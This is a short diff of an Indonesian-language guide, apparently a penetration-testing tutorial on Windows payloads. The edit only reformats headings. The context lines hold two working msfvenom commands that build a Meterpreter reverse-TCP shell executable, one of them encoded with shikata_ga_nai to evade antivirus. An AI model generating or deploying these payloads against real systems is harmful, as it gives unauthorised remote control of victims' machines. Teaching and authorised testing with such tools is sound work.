@@ -28,7 +28,7 @@ Keterangan:
 
 ## C. Contoh Payload Windows
 
-### 1. Payload Reverse TCP:
+1. Payload Reverse TCP:
 
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
@@ -36,7 +36,7 @@ Keterangan:
 
    Output: `shell.exe` (bisa dijalankan di sistem Windows).
 
-### 2. Payload Dilengkapi Encoder:
+2. Payload Dilengkapi Encoder:
   
    ```
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
